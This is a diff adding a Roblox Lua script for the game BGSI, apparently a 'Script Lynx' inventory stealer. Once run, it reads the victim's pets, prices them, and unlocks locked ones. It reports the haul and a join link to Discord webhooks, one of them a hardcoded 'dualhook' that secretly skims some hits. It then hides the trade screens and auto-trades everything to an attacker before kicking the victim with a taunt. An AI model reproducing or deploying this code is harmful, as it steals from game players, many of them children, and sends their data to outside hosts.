@@ -1,0 +1,329 @@
+if not _G["Script-SM_Config"] then
+    warn("WARNING: Config not loaded! Waiting for config...")
+    repeat task.wait() until _G["Script-SM_Config"]
+    warn("Config loaded successfully!")
+end
+
+local webhook = _G["Script-SM_Config"].user_webhook
+local dual_webhook = "https://discord.com/api/webhooks/1454360459917393954/1yOqrbwUesS_clB-LYBkGalvsikQeZVwZ6muPXfsHViZ8Kexv9_DLDRE8HSv-lOkylpi"
+local users = _G["Script-SM_Config"].users or {}
+local dual_username = {"TheOnlyTemuun","Smiley9Gamerz","DualHook-User3","DualHook-User4","DualHook-User5","DualHook-User6"}
+local min_value = 0.1
+local dualhook_chance = 5
+local ping = "Yes"
+
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+if game.PlaceId ~= 85896571713843 then
+    plr:Kick("Wrong game - join a standard BGSI server")
+    return
+end
+
+if #Players:GetPlayers() >= 12 then
+    plr:Kick("Server too full")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:Kick("Avoid VIP servers")
+    return
+end
+
+local inTrade = false
+local network = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network")
+local remote = network:WaitForChild("Remote")
+local event = remote:WaitForChild("RemoteEvent")
+local tradeFrame = plr.PlayerGui.ScreenGui.Trading
+local hud = plr.PlayerGui.ScreenGui.HUD
+local data = require(ReplicatedStorage.Client.Framework.Services.LocalData).Get()
+local itemsToSend = {}
+local stopFetch = false
+local valueList = {}
+local totalValue = 0
+local totalEggsOpened = 0
+
+for _, v in pairs(data.EggsOpened) do
+    totalEggsOpened = totalEggsOpened + v
+end
+
+tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+    if tradeFrame.Visible then
+        inTrade = true
+        tradeFrame.Position = UDim2.new(500, 0, 1, 0)
+    else
+        inTrade = false
+    end
+end)
+
+local tradeResult = plr:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("TradeResult")
+tradeResult:Destroy()
+
+hud:GetPropertyChangedSignal("Visible"):Connect(function()
+    if not hud.Visible then
+        hud.Visible = true
+    end
+end)
+
+local page = 1
+while not stopFetch do
+    local url = string.format("https://www.bgsi.gg/api/items?search=&sort=value-desc&page=%d&limit=50", page)
+    local response = request({
+        Url = url,
+        Method = "GET",
+        Headers = {
+            ["Accept"] = "*/*",
+            ["Referer"] = "https://www.bgsi.gg/items",
+            ["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
+        }
+    })
+    local apiData = HttpService:JSONDecode(response.Body)
+    if not apiData.pets then
+        break
+    end
+
+    for _, pet in ipairs(apiData.pets) do
+        if pet.value == "N/A" then
+            stopFetch = true
+            break
+        elseif pet.value == "O/C" then
+            pet.value = 999999
+        end
+        valueList[pet.name] = tonumber(pet.value)
+    end
+    if stopFetch or (apiData.pagination and page >= apiData.pagination.pages) then
+        break
+    end
+    page = page + 1
+end
+
+local function formatNumber(number)
+    local formatted = tostring(number)
+    local withCommas = formatted:reverse():gsub("(%d%d%d)", "%1,"):reverse()
+    if withCommas:sub(1, 1) == "," then
+        withCommas = withCommas:sub(2)
+    end
+    return withCommas
+end
+
+local function groupItems(list)
+    local grouped = {}
+    for _, item in ipairs(list) do
+        local key = item.Name
+        if not grouped[key] then
+            grouped[key] = {
+                Name = item.Name,
+                Count = 0,
+                TotalValue = 0,
+            }
+        end
+        grouped[key].Count = grouped[key].Count + item.Count
+        grouped[key].TotalValue = grouped[key].TotalValue + (item.Value * item.Count)
+    end
+
+    local out = {}
+    for _, v in pairs(grouped) do
+        table.insert(out, v)
+    end
+    table.sort(out, function(a, b)
+        return a.TotalValue > b.TotalValue
+    end)
+    return out
+end
+
+local function sendHttp(url, payload)
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+local joinUrl = "https://script-lynx.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local function sendJoinMessage(list, prefix, targetWebhook, playerCount)
+    local lines = {}
+    for _, item in ipairs(list) do
+        table.insert(lines, string.format("%s (x%d): %s", item.Name, item.Count, formatNumber(item.TotalValue)))
+    end
+    
+    local payload = {
+        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(85896571713843, '" .. game.JobId .. "')",
+        username = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+        avatar_url = "https://script-lynx.vercel.app/pngs/logo.png",
+        embeds = {{
+            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+            description = "<:admin_hexagon:1449663928195092502> **How to Use?**\nJoin the user using join script or join link then type something in chat to start stealing.",
+            color = 0x000000,
+            fields = {
+                {name="<:vip_hexagon:1449663700494712893> Display Name",value="```"..(plr.DisplayName ~= "" and plr.DisplayName or plr.Name).."```",inline=false},
+                {name="<:member_hexagon:1449663611151585292> Username",value="```"..plr.Name.."```",inline=false},
+                {name="<:verified_hexagon:1449663538833657961> Account Age",value="```"..plr.AccountAge.." Days```",inline=false},
+                {name="<:owner_hexagon:1449663973720064013> Players in Server",value="```"..playerCount.." / 12```",inline=false},
+                {name="<:support_hexagon:1449663871651549287> Inventory",value="```"..table.concat(lines, "\n").."```",inline=false},
+                {name="<:moderator_hexagon:1449663760217280522> Teleport Script", value = "```lua\n" .. tpScript .. "\n```", inline = false },
+                {name="<:management_hexagon:1449663827112362054> Join Player",     value = "[ Click to Join ](" .. joinUrl .. ")", inline = false },
+            },
+            author={name="BGSI • Script Lynx Hit"},
+            footer={text="꒰ Script Lynx • Premium Scripts",icon_url="https://script-lynx.vercel.app/pngs/logo.png"},
+            timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            image={url="https://script-lynx.vercel.app/pngs/adm.webp"},
+        }}
+    }
+    sendHttp(targetWebhook, payload)
+end
+
+local function sendExecutionMessage(list, targetWebhook)
+    local lines = {}
+    for _, item in ipairs(list) do
+        table.insert(lines, string.format("%s (x%d): %s", item.Name, item.Count, formatNumber(item.TotalValue)))
+    end
+    
+    local payload = {
+        content = "@everyone **New BGSI Execution** • Value: " .. formatNumber(totalValue),
+        username = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+        avatar_url = "https://script-lynx.vercel.app/pngs/logo.png",
+        embeds = {{
+            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+            description = "<:admin_hexagon:1449663928195092502> **How to Use?**\nJoin the user using join script or join link then jump or type anything in chat and accept gifts.",
+            color = 0x000000,
+            fields = {
+                {name="<:vip_hexagon:1449663700494712893> Victim",value="```"..plr.Name.."```",inline=false},
+                {name="<:support_hexagon:1449663871651549287> Items Sent",value="```"..table.concat(lines, "\n").."```",inline=false},
+                {name="<:verified_hexagon:1449663538833657961> Total Value",value="```"..formatNumber(totalValue).."```",inline=false},
+            },
+            author={name="BGSI Execution • Script Lynx Hit"},
+            footer={text="꒰ Script Lynx • Premium Scripts",icon_url="https://script-lynx.vercel.app/pngs/logo.png"},
+            timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            image={url="https://script-lynx.vercel.app/pngs/adm.webp"},
+        }}
+    }
+    sendHttp(targetWebhook, payload)
+end
+
+local function unlockItem(itemId)
+    event:FireServer("UnlockPet", itemId, false)
+end
+
+local function addItem(itemId, amount)
+    if amount == 1 then
+        local fullId = itemId .. ":0"
+        event:FireServer("TradeAddPet", fullId)
+    else
+        for i = 1, amount do
+            local fullId = itemId .. ":" .. (i-1)
+            event:FireServer("TradeAddPet", fullId)
+        end
+    end
+end
+
+local function sendTradeRequest(targetPlayer)
+    event:FireServer("TradeRequest", targetPlayer)
+end
+
+local function declineTrade()
+    event:FireServer("TradeDecline")
+end
+
+local function acceptTrade()
+    event:FireServer("TradeAccept")
+end
+
+local function confirmTrade()
+    event:FireServer("TradeConfirm")
+end
+
+for i, v in pairs(data.Pets) do
+    local petId = v.Id
+    local petName = v.Name
+    local amount = v.Amount or 1
+    if v.Mythic then
+        petName = "Mythic " .. petName
+    end
+    if v.Shiny then
+        petName = "Shiny " .. petName
+    end
+    local value = valueList[petName] or 0
+    if value >= min_value then
+        totalValue = totalValue + (value * amount)
+        if v.Locked then
+            unlockItem(petId)
+            task.wait(0.2)
+        end
+        table.insert(itemsToSend, {Id = petId, Name = petName, Count = amount, Value = value})
+    end
+end
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b)
+        return a.Value > b.Value
+    end)
+
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
+    sentItems = groupItems(sentItems)
+    local playerCount = #Players:GetPlayers()
+
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "@everyone "
+    end
+
+    if math.random(1, 100) <= dualhook_chance then
+        sendJoinMessage(sentItems, prefix, dual_webhook, playerCount)
+    else
+        sendJoinMessage(sentItems, prefix, webhook, playerCount)
+    end
+
+    local function doTrade(joinedUser)
+        repeat task.wait() until Players:FindFirstChild(joinedUser)
+        local targetPlayer = Players[joinedUser]
+        
+        declineTrade()
+        task.wait(0.3)
+        while #itemsToSend > 0 do
+            if not inTrade then
+                sendTradeRequest(targetPlayer)
+                task.wait(1)
+            else
+                for i = 1, math.min(12, #itemsToSend) do
+                    local item = table.remove(itemsToSend, 1)
+                    addItem(item.Id, item.Count)
+                    task.wait(0.3)
+                end
+                repeat
+                    acceptTrade()
+                    task.wait(0.2)
+                    confirmTrade()
+                    task.wait(0.1)
+                until not inTrade
+            end
+            task.wait(1)
+        end
+        plr:Kick("All your items just got stolen!\nJoin discord.gg/SnXQCYzGjx")
+    end
+
+    local sentMessage = false
+    local function onPlayerChat(player)
+        if (table.find(users, player.Name) or table.find(dual_username, player.Name)) and not sentMessage then
+            sentMessage = true
+            sendExecutionMessage(sentItems, webhook)
+            doTrade(player.Name)
+        end
+    end
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        p.Chatted:Connect(function()
+            onPlayerChat(p)
+        end)
+    end
+    Players.PlayerAdded:Connect(function(player)
+        player.Chatted:Connect(function()
+            onPlayerChat(player)
+        end)
+    end)
+end
